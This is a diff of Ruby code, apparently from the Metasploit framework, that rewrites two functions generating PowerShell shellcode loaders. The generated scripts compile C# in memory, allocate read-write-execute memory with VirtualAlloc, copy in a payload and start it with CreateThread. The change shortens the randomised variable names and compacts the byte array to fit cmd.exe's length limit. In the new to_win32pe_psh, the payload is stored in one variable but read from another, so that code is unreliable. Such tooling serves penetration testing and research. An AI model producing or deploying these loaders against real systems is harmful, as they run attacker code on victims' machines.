@@ -1147,94 +1147,79 @@ End Sub
 		source
 	end
 
-	def self.to_win32pe_psh_net(framework, code, opts={})
-		var_code = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_kernel32 = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_baseaddr = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_threadHandle = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_output = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_temp = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_codeProvider = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_compileParams = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_syscode = Rex::Text.rand_text_alpha(rand(8)+8)
+        def self.to_win32pe_psh_net(framework, code, opts={})
+                var_code = Rex::Text.rand_text_alpha(rand(3)+2)
+                var_kernel32 = Rex::Text.rand_text_alpha(rand(3)+2)
+                var_baseaddr = Rex::Text.rand_text_alpha(rand(3)+2)
+                var_threadHandle = Rex::Text.rand_text_alpha(rand(3)+2)
+                var_output = Rex::Text.rand_text_alpha(rand(3)+2)
+                var_temp = Rex::Text.rand_text_alpha(rand(3)+2)
+                var_codeProvider = Rex::Text.rand_text_alpha(rand(3)+2)
+                var_compileParams = Rex::Text.rand_text_alpha(rand(3)+2)
+                var_syscode = Rex::Text.rand_text_alpha(rand(3)+2)
+                var_function = Rex::Text.rand_text_alpha_lower(rand(3)+2)
 
-		code = code.unpack('C*')
-		psh = "Set-StrictMode -Version 2\r\n"
-		psh << "$#{var_syscode} = @\"\r\nusing System;\r\nusing System.Runtime.InteropServices;\r\n"
-		psh << "namespace #{var_kernel32} {\r\n"
-		psh << "public class func {\r\n"
-		psh << "[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }\r\n"
-		psh << "[Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }\r\n"
-		psh << "[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }\r\n"
-		psh << "[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\r\n"
-		psh << "[DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\r\n"
-		psh << "[DllImport(\"kernel32.dll\")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);\r\n"
-		psh << "} }\r\n"
-		psh << "\"@\r\n\r\n"
-		psh << "$#{var_codeProvider} = New-Object Microsoft.CSharp.CSharpCodeProvider\r\n"
-		psh << "$#{var_compileParams} = New-Object System.CodeDom.Compiler.CompilerParameters\r\n"
-		psh << "$#{var_compileParams}.ReferencedAssemblies.AddRange(@(\"System.dll\", [PsObject].Assembly.Location))\r\n"
-		psh << "$#{var_compileParams}.GenerateInMemory = $True\r\n"
-		psh << "$#{var_output} = $#{var_codeProvider}.CompileAssemblyFromSource($#{var_compileParams}, $#{var_syscode})\r\n\r\n"
+                psh = "Set-StrictMode -Version 2\r\n"
+                # Configure the C# namespace
+                psh << "$#{var_syscode} = @\"\r\nusing System;\r\nusing System.Runtime.InteropServices;\r\n"
+                psh << "namespace #{var_kernel32} {\r\n"
+                psh << "public class #{var_function} {\r\n"
+                psh << "[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }\r\n"
+                psh << "[Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }\r\n"
+                psh << "[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }\r\n"
+                psh << "[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\r\n"
+                psh << "[DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\r\n"
+                psh << "[DllImport(\"kernel32.dll\")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);\r\n"
+                psh << "} }\r\n"
+                psh << "\"@\r\n\r\n"
+                # Creat the compiler and set options for in-memory compile
+                psh << "$#{var_codeProvider} = New-Object Microsoft.CSharp.CSharpCodeProvider\r\n"
+                psh << "$#{var_compileParams} = New-Object System.CodeDom.Compiler.CompilerParameters\r\n"
+                psh << "$#{var_compileParams}.ReferencedAssemblies.AddRange(@(\"System.dll\", [PsObject].Assembly.Location))\r\n"
+                psh << "$#{var_compileParams}.GenerateInMemory = $True\r\n"
+                psh << "$#{var_output} = $#{var_codeProvider}.CompileAssemblyFromSource($#{var_compileParams}, $#{var_syscode})\r\n\r\n"
+                # Generate our payload byte array
+                # My apologies to the formatting gods, but this type of payload
+                # is space constrained by cmd.exe's character limit.
+                # The usual convention for col-width in the payload variable is untenable here
+                psh << "[Byte[]]$#{var_code} = #{Rex::Text.to_hex(code).gsub('\x',',0x')[1..-1]}\r\n"
+                psh << "$#{var_baseaddr} = [#{var_kernel32}.#{var_function}]::VirtualAlloc(0, $#{var_code}.Length + 1, [#{var_kernel32}.#{var_function}+AllocationType]::Reserve -bOr [#{var_kernel32}.#{var_function}+AllocationType]::Commit, [#{var_kernel32}.#{var_function}+MemoryProtection]::ExecuteReadWrite)\r\n"
+                psh << "if ([Bool]!$#{var_baseaddr}) { $global:result = 3; return }\r\n"
+                psh << "[System.Runtime.InteropServices.Marshal]::Copy($#{var_code}, 0, $#{var_baseaddr}, $#{var_code}.Length)\r\n"
+                psh << "[IntPtr] $#{var_threadHandle} = [#{var_kernel32}.#{var_function}]::CreateThread(0,0,$#{var_baseaddr},0,0,0)\r\n"
+                psh << "if ([Bool]!$#{var_threadHandle}) { $global:result = 7; return }\r\n"
+                psh << "$#{var_temp} = [#{var_kernel32}.#{var_function}]::WaitForSingleObject($#{var_threadHandle}, [#{var_kernel32}.#{var_function}+Time]::Infinite) | Out-Null\r\n"
+        end 
 
-		psh << "[Byte[]]$#{var_code} = 0x#{code[0].to_s(16)}"
-		lines = []
-		1.upto(code.length-1) do |byte|
-			if(byte % 10 == 0)
-				lines.push "\r\n$#{var_code} += 0x#{code[byte].to_s(16)}"
-			else
-				lines.push ",0x#{code[byte].to_s(16)}"
-			end
-		end
-		psh << lines.join("") + "\r\n\r\n"
+        def self.to_win32pe_psh(framework, code, opts={})
 
-		psh << "$#{var_baseaddr} = [#{var_kernel32}.func]::VirtualAlloc(0, $#{var_code}.Length + 1, [#{var_kernel32}.func+AllocationType]::Reserve -bOr [#{var_kernel32}.func+AllocationType]::Commit, [#{var_kernel32}.func+MemoryProtection]::ExecuteReadWrite)\r\n"
-		psh << "if ([Bool]!$#{var_baseaddr}) { $global:result = 3; return }\r\n"
-		psh << "[System.Runtime.InteropServices.Marshal]::Copy($#{var_code}, 0, $#{var_baseaddr}, $#{var_code}.Length)\r\n"
-		psh << "[IntPtr] $#{var_threadHandle} = [#{var_kernel32}.func]::CreateThread(0,0,$#{var_baseaddr},0,0,0)\r\n"
-		psh << "if ([Bool]!$#{var_threadHandle}) { $global:result = 7; return }\r\n"
-		psh << "$#{var_temp} = [#{var_kernel32}.func]::WaitForSingleObject($#{var_threadHandle}, [#{var_kernel32}.func+Time]::Infinite)\r\n"
-	end
+                var_code = Rex::Text.rand_text_alpha(rand(3)+2)
+                var_win32_func = Rex::Text.rand_text_alpha(rand(3)+2)
+                var_payload = Rex::Text.rand_text_alpha(rand(3)+2)
+                var_size = Rex::Text.rand_text_alpha(rand(3)+2)
+                var_rwx = Rex::Text.rand_text_alpha(rand(3)+2)
+                var_iter = Rex::Text.rand_text_alpha(rand(3)+2)
 
-	def self.to_win32pe_psh(framework, code, opts={})
-
-		var_code = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_win32_func = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_payload = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_size = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_rwx = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_iter = Rex::Text.rand_text_alpha(rand(8)+8)
-		code = code.unpack("C*")
-
-		# Add wrapper script
-		psh = "$#{var_code} = @\"\r\n"
-		psh << "[DllImport(\"kernel32.dll\")]\r\n"
-		psh << "public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\r\n"
-		psh << "[DllImport(\"kernel32.dll\")]\r\n"
-		psh << "public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\r\n"
-		psh << "[DllImport(\"msvcrt.dll\")]\r\n"
-		psh << "public static extern IntPtr memset(IntPtr dest, uint src, uint count);\r\n"
-		psh << "\"@\r\n"
-		psh << "$#{var_win32_func} = Add-Type -memberDefinition $#{var_code} -Name \"Win32\" -namespace Win32Functions -passthru\r\n"
-		# Set up the payload string
-		psh << "[Byte[]]$#{var_payload} = 0x#{code[0].to_s(16)}"
-		lines = []
-		1.upto(code.length-1) do |byte|
-			if(byte % 10 == 0)
-				lines.push "\r\n$#{var_payload} += 0x#{code[byte].to_s(16)}"
-			else
-				lines.push ",0x#{code[byte].to_s(16)}"
-			end
-		end
-		psh << lines.join("") + "\r\n\r\n"
-		psh << "$#{var_size} = 0x1000\r\n"
-		psh << "if ($#{var_payload}.Length -gt 0x1000) {$#{var_size} = $#{var_payload}.Length}\r\n"
-		psh << "$#{var_rwx}=$#{var_win32_func}::VirtualAlloc(0,0x1000,$#{var_size},0x40)\r\n"
-		psh << "for ($#{var_iter}=0;$#{var_iter} -le ($#{var_payload}.Length-1);$#{var_iter}++) {$#{var_win32_func}::memset([IntPtr]($#{var_rwx}.ToInt32()+$#{var_iter}), $#{var_payload}[$#{var_iter}], 1)}\r\n"
-		psh << "$#{var_win32_func}::CreateThread(0,0,$#{var_rwx},0,0,0)\r\n"
+                # Add wrapper script
+                psh = "$#{var_code} = @\"\r\n"
+                psh << "[DllImport(\"kernel32.dll\")]\r\n"
+                psh << "public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\r\n"
+                psh << "[DllImport(\"kernel32.dll\")]\r\n"
+                psh << "public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\r\n"
+                psh << "[DllImport(\"msvcrt.dll\")]\r\n"
+                psh << "public static extern IntPtr memset(IntPtr dest, uint src, uint count);\r\n"
+                psh << "\"@\r\n"
+                psh << "$#{var_win32_func} = Add-Type -memberDefinition $#{var_code} -Name \"Win32\" -namespace Win32Functions -passthru\r\n"
+                # Set up the payload string, see psh_net for formatting reason
+                psh << "[Byte[]]$#{var_code} = #{Rex::Text.to_hex(code).gsub('\x',',0x')[1..-1]}\r\n"
+                psh << "$#{var_size} = 0x1000\r\n"
+                psh << "if ($#{var_payload}.Length -gt 0x1000) {$#{var_size} = $#{var_payload}.Length}\r\n"
+                psh << "$#{var_rwx}=$#{var_win32_func}::VirtualAlloc(0,0x1000,$#{var_size},0x40)\r\n"
+                psh << "for ($#{var_iter}=0;$#{var_iter} -le ($#{var_payload}.Length-1);$#{var_iter}++) {$#{var_win32_func}::memset([IntPtr]($#{var_rwx}.ToInt32()+$#{var_iter}), $#{var_payload}[$#{var_iter}], 1)}\r\n"
+                psh << "$#{var_win32_func}::CreateThread(0,0,$#{var_rwx},0,0,0)\r\n"
 
 
-	end
+        end
 
 	def self.to_win32pe_vbs(framework, code, opts={})
 		to_exe_vbs(to_win32pe(framework, code, opts), opts)
